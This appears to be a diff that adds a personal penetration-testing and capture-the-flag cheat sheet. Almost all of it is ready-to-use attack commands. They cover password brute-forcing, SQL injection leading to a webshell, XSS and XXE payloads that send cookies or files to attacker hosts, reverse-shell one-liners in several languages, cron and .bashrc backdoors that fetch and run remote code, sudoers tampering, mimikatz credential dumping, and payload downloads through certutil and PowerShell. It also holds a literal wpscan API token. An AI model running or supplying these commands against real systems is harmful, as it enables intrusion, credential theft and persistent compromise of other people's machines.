@@ -1,0 +1,616 @@
+-----------------------------
+   Brute Force
+-----------------------------
+hydra -l username -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login:username=^USER^&password=^PASS^:S=302" -V
+hydra -l username -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
+hydra -l username -P /usr/share/wordlists/rockyou.txt $IP -t 4 mysql
+
+wpscan –url $IP -U username –passwords /etc/wordlists/rockyou.txt
+ffuf -w /usr/share/wordlists/10k-most-common.txt -X POST -d '$data' -u http://$IP/FUZZ
+ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -u http://$IP/FUZZ -e php
+
+-----------------------------
+   Scanning
+-----------------------------
+nmap -A -T4 -oN scan $IP
+nmap -sV -sC -Pn -n -A $IP
+rustscan -a $IP  -- -A
+
+nikto -h $IP
+zaproxy
+snyk
+Nessus
+
+-----------------------------
+   Enumeration
+-----------------------------
+ffuf -c -w /usr/share/wordlists/rockyou.txt -t 50 -e txt,php,db --hc 404 -u $IP
+gobuster dir -w /usr/share/wordlists/directory-list-2.3-medium.txt -x txt -t 100 -u $IP
+gobuster vhost --append-domain -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -u $IP
+
+wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "identifier=admin&password=FUZZ" -u $IP
+
+enum4linux -a $IP
+sqlmap -u $IP/loginpage --forms --dump
+wpscan --url $IP --api-token "tSq9e7NLDLZhpi4Fs5LDIhD2aJ6gx0o7ztx5i4z1x94"
+
+gitleaks --repo-path $path -v
+
+---subdomains---
+shodan.io
+https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration
+amass enum -passive -d example.com -o example.com.subs.txt
+amass enum -active -brute -w /hpath/DNS/clean-jhaddix-dns.txt -d example.com -o example.com.subs.brute.txt
+amass enum -df rootdomains.txt -max-dns-queries 100 -w subdomains.txt -o foundSubdomains.txt
+
+-------------
+Horizontal Enum
+-------------
+whois domain.com
+https://viewdns.info/ -- reverse whois
+
+dig a subdomain.domain.com +short
+https://bgpview.io/ -- ASN
+
+copyright or Term’s and Condition
+intext:"©2021 imaginaryCompany All rights reserved."
+
+-------------
+Vertical Enum
+-------------
+--certs--
+https://crt.sh -- domain enum through certificate
+
+--wayback--
+https://github.com/lc/gau + urlscan api
+cat domains.txt | waybackurls > urls
+
+--OSINT--
+pastebin (intext:)
+github or gitlab
+https://github.com/gwen001/github-search.git
+
+--Existing databases--
+https://opendata.rapid7.com/sonar.fdns_v2/
+zgrep '\.domain\.com",' path_to_chosen_dataset.json.gz
+
+--lists--
+https://wordlists.assetnote.io/
+https://github.com/assetnote/commonspeak2 (generate for your self)
+
+-----------------------------
+Domain zone transfer
+-----------------------------
+dig axfr @<DNS_IP> [Try zone transfer without domain]
+dig axfr @<DNS_IP> <DOMAIN> [Try zone transfer guessing the domain]
+fierce --domain <DOMAIN> --dns-servers <DNS_IP> [Tries zone transfer against every authoritative name server, if it doesn’t work will try a dictionary attack]
+
+dig ANY @<DNS_IP> <DOMAIN> [you can replace ANY with A, AAAA, TXT, MX, NS, etc.]
+
+https://mxtoolbox.com
+
+-----------------------------
+Port 389/636
+-----------------------------
+crackmapexec
+ldapsearch -x -h <IP> -s base namingcontexts
+ldapsearch -x -h <IP> -b ‘<naming context>’
+[Example]
+ldapsearch -x -h 10.10.10.175 -b ‘DC=EGOTISTICAL-BANK,DC=LOCAL’
+
+
+-----------------------------
+   Connecting / mounting
+-----------------------------
+showmount -e $IP
+sudo mount $IP:/file/trace /tmp
+
+/usr/bin/smbclient \\\\$IP\\file
+/usr/bin/smbclient -L $IP
+
+mysql --protocol=tcp --host=$IP --port=3306 --user=root -p
+xfreerdp /u: "user" /p: "pass" /v:$IP
+
+-----------------------------
+   Cracking
+-----------------------------
+/usr/share/john/ssh2john.py (file) > output
+sudo john -w=/usr/share/wordlists/rockyou.txt (hash)
+hashcat -m "type" .txt /usr/share/wordlists/rockyou.txt
+
+sudo zip2john .zip > output
+sudo rar2john .rar > hash
+fcrackzip .zip
+7z e .zip
+
+sudo gpg2john .asc > output
+gpg --import .asc
+gpg --decrypt .pgp
+
+-----------------------------
+   Priv. escalation
+-----------------------------
+python3 -c "import pty;pty.spawn('/bin/bash')"
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+# os.setuid(0)
+
+getcap -r / 2>/dev/null
+ps -aux
+
+netstat -lntup / -tulwn
+
+cat ~/.*history | less
+echo '$user  ALL=(ALL:ALL) ALL' >> /etc/sudoers
+ALL=(ALL:ALL) NOPASSWD:ALL
+
+# SETUID or SETGID bits set
+find / -type f \( -perm -4000 -o -perm -2000 \) -print
+find / -name flag.txt | user.txt -type f 2>/dev/null
+
+# Writable
+find /etc -writable -ls 2>/dev/null
+
+*  *    * * *   root    bash /tmp/zsr
+
+less -r
+
+-----------------------------
+   Upgrading Shell
+-----------------------------
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+(upgrading shell without python)
+/usr/bin/script -qc /bin/bash /dev/null
+
+^Z
+stty raw -echo; fg
+export TERM=xterm
+export TERM=xterm-256color
+
+stty size
+stty rows <num> columns <cols>
+
+-----------------------------
+   Binary exploitation
+-----------------------------
+# tools
+rabin2 (-z, -I), gdb, r2 (aaa, pdf), strings,
+xxd, ltrace, strace, objdump, hexedit, hexdump
+
+checksec --file=<file>
+
+# Binary path exploit
+export PATH=/tmp:$PATH
+printenv
+
+# Core dump
+^Z
+kill -s SIGSEGV PID && fg
+apport-unpack /var/crashes/_$program_.crash /tmp/crash-report
+
+# printf-uncontrolled format string
+%016py
+x/s
+x/20g
+0x{var:016x}
+man ascii
+
+# vulnerable functions
+gets() & strcpy() & strcat() & strcmp() & sprintf()
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6A413969
+
+https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html
+
+-----------------------------
+   Reverse Engineering
+-----------------------------
+strace ./file
+ltrace ./file
+
+objdump -x file
+strings file
+
+upx -d file -o output
+
+# editors
+r2 -A file
+Ghidra
+cutter
+
+https://www.youtube.com/watch?v=RCgEIBfnTEI
+# syscalls
+read, write
+-----------------------------
+   XSS
+-----------------------------
+'<script>alert(document.cookie)</script>
+<img src=x onerror=alert(document.cookie) >
+<script>document.location = "ngrok.io"+ document.cookie </script>
+
+xsser -- automatic framework for xss
+
+--WAF detect--
+https://github.com/EnableSecurity/wafw00f
+--WAF bypass--
+https://github.com/0xInfection/Awesome-WAF#known-bypasses
+
+--cheatsheet--
+https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45
+
+-----------------------------
+   XXE
+-----------------------------
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=acc.php"> ]>
+
+SSRF + XXE
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+
+BLIND
+based on error, out-of-band technic
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+
+XInclude
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+Upload
+docx(unzip ./test.docx -d ./unzipped/), svg
+image processing library(PNG, JPEG) -> can support svg
+
+Modified content-type
+Content-Type: text/xml
+
+--cheatsheet--
+https://gist.github.com/staaldraad/01415b990939494879b4
+
+-----------------------------
+   SQL injection
+-----------------------------
+find out the type of database
+
+# union injection
+{"breached' and 0=1 union select 'A',database(),'C'-- -":"10"}
+{"breached' and 0=1 union select 1,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='checkout'-- -":"10"}
+
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+
+{"breached' and 0=1 union select 1, username, password from checkout.user-- -":"10"}
+{"breached' and 0=1 union select 1, password, username from checkout.user-- -":"10"}
+
+--	   :	Comment Type 1
+--+	:	Comment Type 2
+--+-	:	SQL Comment
+/**/	:	Inline Comment
+;%00	:	Null Byte
+
+https://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/MSSQL-Error-Based-Injection.html
+
+SQL -> RCE
+SELECT "<?php system($_GET['<anyParameter>']); ?>" into outfile "/var/www/html/<filename>.php"
+
+mysql> SELECT sys_exec('chmod u+s /usr/bin/find');
+mysql> echo os.system('/bin/bash')
+
+--cheatsheet--
+https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+https://github.com/payloadbox/sql-injection-payload-list
+
+-----------------------------
+   Steganography
+-----------------------------
+stegcracker .png /usr/share/wordlists/rockyou.txt
+steghide --extract -sf .png
+hexedit
+stegoveritas .jpg
+binwalk --dd '.*' .jpg
+exiftool
+
+-----------------------------
+   Reverse Shells
+-----------------------------
+bash -i >& /dev/tcp/$IP/4444 0>&1
+php -r '$sock=fsockopen("$IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+ruby -rsocket -e'f=TCPSocket.open("$IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+perl -e 'use Socket;$i="$IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $IP 4444 >/tmp/f
+require('child_process').exec('nc -e /bin/sh $IP 4444')
+
+-----------------------------
+   LXC Vuln
+-----------------------------
+lxc image import ./alpine --alias myimage
+(lxd init)
+lxc init myimage mycontainer -c security.privileged=true
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+
+-----------------------------
+   LFI - local file inclusion
+-----------------------------
+../../../etc/passwd
+
+-- Bypass lfi filter --
+.././..
+..//..
+...//...
+%00 -- Nullbyte (php5)
+%%32%65
+
+https://highon.coffee/blog/lfi-cheat-sheet/
+-----------------
+   Log Poisoning
+-----------------
+../../../../../../../etc/httpd/logs/acces_log
+../../../../../../../etc/httpd/logs/acces.log
+../../../../../../../etc/httpd/logs/error_log
+../../../../../../../etc/httpd/logs/error.log
+../../../../../../../var/www/logs/access_log
+../../../../../../../var/www/logs/access.log
+../../../../../../../usr/local/apache/logs/access_log
+../../../../../../../usr/local/apache/logs/access.log
+../../../../../../../var/log/apache/access_log
+../../../../../../../var/log/apache2/access_log
+../../../../../../../var/log/apache/access.log
+../../../../../../../var/log/apache2/access.log
+../../../../../../../var/log/access_log
+../../../../../../../var/log/access.log
+../../../../../../../var/www/logs/error_log
+../../../../../../../var/www/logs/error.log
+../../../../../../../usr/local/apache/logs/error_log
+../../../../../../../usr/local/apache/logs/error.log
+../../../../../../../var/log/apache/error_log
+../../../../../../../var/log/apache2/error_log
+../../../../../../../var/log/apache/error.log
+../../../../../../../var/log/apache2/error.log
+../../../../../../../var/log/error_log
+../../../../../../../var/log/error.log
+system($_REQUEST['cmd']);
+bash -c "bash -i >& /dev/tcp/$IP/4444 0>&1"
+php://filter/convert.base64-encode/resource=
+curl "url" -H "User-Agent: <?php system(\$_GET['c']); ?>"
+&ext&c=(command)
+
+(use burpsuite)
+
+------------------------------
+   Lisening networks
+------------------------------
+https://apackets.com/  // packet analyzator wireshark
+sudo ettercap -T -S -i wlan0 -M arp:remote /router// /someone// // new lisen wireshark encrypted https
+
+http://exif.regex.info/exif.cgi // exif viewer
+
+-----------------------------
+   Wordpress
+-----------------------------
+exploit/unix/webapp/wp_admin_shell_upload
+wpscan
+
+-----------------------------
+   SSRF and CRSF
+-----------------------------
+SSRF = redirect to localhost
+CRSF = del profile send something
+
+-----------------------------
+   Server-side request forgery (SSRF)
+-----------------------------
+Is really powerfull when combined with 2nd vulnerability
+
+--protocols--
+file://
+gopher:// (could lead to rce, Gopherus)
+
+ftp://
+dict://
+ddap.//
+ssh://
+smb://
+http://
+https://
+
+-----------------------------
+   WINDOWS reset password
+-----------------------------
+Windows/System32/config
+sudo chntpw -i SAM
+
+-mimikatz-
+privilege::debug
+lsadump::sam
+sekurlsa::logonpasswords
+
+-----------------------------
+   Windows rev. shell
+-----------------------------
+https://amsi.fail/
+https://raikia.com/tool-powershell-encoder/
+
+-----------------------------
+   Servers
+-----------------------------
+service apache2 start
+python3 -m http.server 1800
+(NODE and NPM)
+
+-----------------------------
+   Port Forwarding
+-----------------------------
+wget $IP/authorized_keys
+ssh -i ~/.ssh/id_rsa -L $ACK_PORT:127.0.0.1:$VIC_PORT $USER@$IP -fN
+
+-----------------------------
+   Filtering
+-----------------------------
+grep -x '.\{8,20\}' > 8-20_length_wordlist
+grep -o '[^ ]*[a-z][^ ]*' > contains_lowercase.txt
+grep -o '[^ ]*[A-Z][^ ]*' > contains_uppercase.txt
+grep -o '[^ ]*[0-9][^ ]*' > contains_numbers.txt
+grep -v "^[A-Za-z0-9]*$" > contains_special.txt
+
+wc -l textfile | number of lines
+
+-----------------------------
+   Reference
+-----------------------------
+https://gchq.github.io/CyberChef/
+https://gtfobins.github.io/
+https://images.google.com/
+
+-----------------------------
+   AWS -- Amazon Cloud
+-----------------------------
+aws configure --profile ""
+aws s3 ls --profile ""
+
+aws sts get-access-key-info --access-key-id "AKIA**"
+aws sts get-caller-identity --profile ""
+
+aws ec2 describe-instances --output text --profile ""
+aws ec2 describe-instances --output text --region "" --profile ""
+
+aws secretsmanager list-secrets --profile hr
+aws secretsmanager get-secret-value --secret-id "" --profile "" --region ""
+
+-----------------------------
+   Mongodb
+-----------------------------
+show databases
+db.getCollectionNames();
+db.$Collection.find()
+
+-----------------------------
+   Linux BackDoors
+-----------------------------
+ssh-keygen
+php-file
+.so file
+
+*  *    * * *   root    bash /tmp/zsr
+*  *    * * *   root    curl http://$IP/bash_shell | base64 -d | bash
+echo 'bash -i >& /dev/tcp/$IP/4444 0>&1' >> ~/.bashrc
+touch -t YYYYMMDDhhmm <file> -- time creation modify
+
+-----------------------------
+   Bash loops
+-----------------------------
+for i in {1..100}; do (sleep 1; echo "get /") | telnet $IP $i | grep 550 >> x ; done
+
+for i in {2500..4500}; do COMMAND ; done
+for i in {4500..1500}; do COMMAND ; done
+
+while true ; do ssh -i id_rsa hades@hell -p `shuf -i 2500-4500 -n 1` ; done
+
+-----------------------------
+google Dorks
+-----------------------------
+https://www.exploit-db.com/google-hacking-database
+
+site:.eu responsible disclosure
+inurl:index.php?id=
+site:.nl bug bounty
+“index of” inurl:wp-content/ (Identify Wordpress Website)
+inurl:”q=user/password” (for finding drupal cms)
+
+(site:) codepen.io, pastebin (intext:)
+
+Aquatone
+
+site:example.com filetype:bak (mdf, zip, sql, db, pdf)
+
+-----------------------------
+   Others
+-----------------------------
+chsh -s /bin/rbash 'user'
+scp file remote@$IP:/dir
+wget -r http://$IP/.git --continue
+cat $file | xclip -selection clipboard
+sed -i 's/192.168.56.101/<YOUR-IP-ADDRESS>/g' shells/*.ps1
+/proc/$i/cmdline
+fakeroot
+masscode
+' -- -
+\  #shell break line
+
+sudo tcpdump -i tun0
+jq -- pretty print jsoni
+XOR -- 35 decimal (most common)
+
+searchsploit -x example
+             -m makecopy
+
+-firewall windows-
+netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT
+
+-exploit suggester-
+windows-exploit-suggester < systeminfo
+
+-Windows transfer files-
+certutil.exe -urlcache -split -f http://<ATTACK_IP>:<WEBSERVER_PORT>/file.exe
+powershell.exe -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile(‘http://<ATTACK_IP>/35936.exe’, ‘C:\temp\35936.exe’)
+
+alias ls='echo "command not found"'
+alias cat='echo "command not found"'
+alias nano='echo "command not found"'
+alias vim='echo "command not found"'
+alias dir='echo "command not found"'
+alias cd='echo "command not found"'
+alias chmod='echo "command not found"'
+alias wget='echo "command not found"'
+alias ps='echo "command not found"'
+alias useradd='echo "command not found"'
+alias passwd='echo "command not found"'
+alias wall='echo "command not found"'
+
+mkpasswd -m (sha-512) password
+
+https://hackersonlineclub.com/command-injection-cheatsheet/
+http://shell-storm.org/shellcode/
+https://github.com/jephk9/oscp-jewels
+https://github.com/rinetd/BurpSuite-1/blob/master/CheatSheet.md
+https://wiki.owasp.org/index.php/OWASP_favicon_database
+https://www.tarlogic.com/blog/how-to-attack-kerberos/
+https://www.schtech.co.uk/linux-reverse-shell-without-python/
+
+--------------------------------------------------------------
+cvedetails.com --
+shodan.io -- scanner for vulns and ports
+apackets.com -- packet analyzator wireshark
+exif.regex.info/exif.cgi -- exif viewer
+archive.org -- old sites
+who.is -- ip track
+Pipl.com -- people name search
+insecam.org -- ip cams
+cyberforensics.in/OnlineEmailTracer/index.aspx -- email tracer
+browserleaks.com -- ip check
+jwt.io -- tokens
+jsfuck.com -- js encoding
+regex101.com -- regex expressions
+godbolt.org -- C/++ -> assembly
+dogbolt.org -- assembly -> C/++
+simpleicons.org -- icons
+github.com/tomnomnom/gf -- wrapper around grep to avoid typing common patterns.
+
+-burp extensions-
+reflected parameters, burpkit, Co2, Copy As Python-Requests, Diff Last Response
+
+--------------------------------------------------------------
